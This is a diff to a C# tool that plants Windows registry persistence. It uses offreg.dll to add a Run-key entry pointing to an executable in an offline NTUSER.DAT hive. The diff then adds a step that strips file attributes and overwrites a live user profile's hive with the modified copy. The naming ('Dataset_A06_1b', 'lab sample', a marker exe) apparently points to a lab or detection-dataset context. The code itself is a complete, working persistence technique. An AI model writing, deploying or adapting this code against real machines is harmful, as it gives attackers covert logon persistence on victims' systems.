@@ -51,10 +51,12 @@ namespace RegistryOfflinePersistence
 
         static int Main(string[] args)
         {
-            // Configuration variables matching your lab sample
-            string targetHivePath = @"C:\Users\Public\NTUSER.DAT";
-            string runKeyName = "Dataset_A06_1b_CSharp";
-            string payloadCommand = @"C:\Windows\System32\calc.exe";
+            // 1. Define paths for the staging file and the ultimate live profile target
+            string stagingHivePath = @"C:\Users\Public\NTUSER.DAT";
+            string liveHivePath = @"C:\Users\LabTestUser\NTUSER.DAT";
+
+            string runKeyName = "Dataset_A06_1b_OfflineHiveSaveRestore_Persistence";
+            string payloadCommand = @"C:\Users\Public\A06_1b_persistence_marker.exe";
             string runKeySubPath = @"Software\Microsoft\Windows\CurrentVersion\Run";
 
             Console.WriteLine("[*] Initializing offline hive manipulation via offreg.dll...");
@@ -64,19 +66,19 @@ namespace RegistryOfflinePersistence
 
             try
             {
-                // 1. Open the offline hive file from disk
-                uint result = OROpenHive(targetHivePath, out hRootKey);
+                // 2. Open the staging hive file from disk
+                uint result = OROpenHive(stagingHivePath, out hRootKey);
                 if (result != ERROR_SUCCESS)
                 {
                     Console.ForegroundColor = ConsoleColor.Red;
-                    Console.WriteLine($"[-] OROpenHive failed. Ensure the file exists and is not locked. Error code: {result}");
+                    Console.WriteLine($"[-] OROpenHive failed. Error code: {result}");
                     Console.ResetColor();
                     return 1;
                 }
 
-                // 2. Open or create the run key path inside the offline hive
+                // 3. Open or create the run key path inside the offline hive
                 uint dwDisposition;
-                result = ORCreateKey(hRootKey, runKeySubPath, null, 0, IntPtr.Zero, out hRunKey, out dwDisposition);
+                result = ORCreateKey(hRootKey, runKeySubPath, string.Empty, 0, IntPtr.Zero, out hRunKey, out dwDisposition);
                 if (result != ERROR_SUCCESS)
                 {
                     Console.ForegroundColor = ConsoleColor.Red;
@@ -85,12 +87,10 @@ namespace RegistryOfflinePersistence
                     return 1;
                 }
 
-                // 3. Prepare the string data. C# strings are UTF-16, so we get the bytes 
-                // and ensure we append a null terminator (\0).
+                // 4. Prepare and inject the string data
                 byte[] commandBytes = System.Text.Encoding.Unicode.GetBytes(payloadCommand + "\0");
                 uint cbData = (uint)commandBytes.Length;
 
-                // 4. Inject the persistence value into the offline tree structure
                 result = ORSetValue(hRunKey, runKeyName, REG_SZ, commandBytes, cbData);
                 if (result != ERROR_SUCCESS)
                 {
@@ -100,9 +100,8 @@ namespace RegistryOfflinePersistence
                     return 1;
                 }
 
-                // 5. Serialize and save the changes back into the binary file
-                // Using 6, 2 for Windows 7 / Windows Server 2008 R2 format as standard target compatibility
-                result = ORSaveHive(hRootKey, targetHivePath, 6, 2);
+                // 5. Serialize and save the changes back into the staging binary file
+                result = ORSaveHive(hRootKey, stagingHivePath, 6, 2);
                 if (result != ERROR_SUCCESS)
                 {
                     Console.ForegroundColor = ConsoleColor.Red;
@@ -112,29 +111,58 @@ namespace RegistryOfflinePersistence
                 }
 
                 Console.ForegroundColor = ConsoleColor.Green;
-                Console.WriteLine($"[+] Successfully created persistence inside offline hive at: {targetHivePath}");
+                Console.WriteLine($"[+] Successfully modified staging hive at: {stagingHivePath}");
                 Console.ResetColor();
+
+                // 6. Mandatory Unmanaged Resource Cleanup BEFORE moving the file
+                // The offreg.dll handles must be closed completely, or Windows will throw a file-lock exception.
+                if (hRunKey != IntPtr.Zero) { ORCloseKey(hRunKey); hRunKey = IntPtr.Zero; }
+                if (hRootKey != IntPtr.Zero) { ORCloseKey(hRootKey); hRootKey = IntPtr.Zero; }
+
+                // 7. Automated Live Hive Replacement Block
+                Console.WriteLine("[*] Attempting automated replacement of the live user hive...");
+                if (System.IO.File.Exists(liveHivePath))
+                {
+                    // Remove System/Hidden attributes on the target live file if they block direct overwriting
+                    System.IO.FileInfo targetFileInfo = new System.IO.FileInfo(liveHivePath);
+                    targetFileInfo.Attributes = System.IO.FileAttributes.Normal;
+
+                    // Overwrite the live NTUSER.DAT with our modified staging copy
+                    System.IO.File.Copy(stagingHivePath, liveHivePath, overwrite: true);
+
+                    Console.ForegroundColor = ConsoleColor.Green;
+                    Console.WriteLine($"[+] Success! Replaced live profile hive at: {liveHivePath}");
+                    Console.ResetColor();
+                }
+                else
+                {
+                    Console.ForegroundColor = ConsoleColor.Yellow;
+                    Console.WriteLine($"[-] Target live path not found: {liveHivePath}. Ensure the user profile exists.");
+                    Console.ResetColor();
+                }
+
                 return 0;
+            }
+            catch (System.IO.IOException ioEx)
+            {
+                Console.ForegroundColor = ConsoleColor.Red;
+                Console.WriteLine($"[-] File system error: {ioEx.Message}");
+                Console.WriteLine("[*] Ensure that 'LabTestUser' is completely logged off so NTUSER.DAT is unlocked.");
+                Console.ResetColor();
+                return 1;
             }
             catch (DllNotFoundException)
             {
                 Console.ForegroundColor = ConsoleColor.Red;
                 Console.WriteLine("[-] Critical Error: offreg.dll could not be found.");
-                Console.WriteLine("[*] Ensure offreg.dll is in the same directory as your executable or in your PATH.");
                 Console.ResetColor();
                 return 1;
             }
             finally
             {
-                // 6. Ensure clean-up occurs regardless of execution success
-                if (hRunKey != IntPtr.Zero)
-                {
-                    ORCloseKey(hRunKey);
-                }
-                if (hRootKey != IntPtr.Zero)
-                {
-                    ORCloseKey(hRootKey);
-                }
+                // Final safety cleanup pass
+                if (hRunKey != IntPtr.Zero) { ORCloseKey(hRunKey); }
+                if (hRootKey != IntPtr.Zero) { ORCloseKey(hRootKey); }
             }
         }
     }
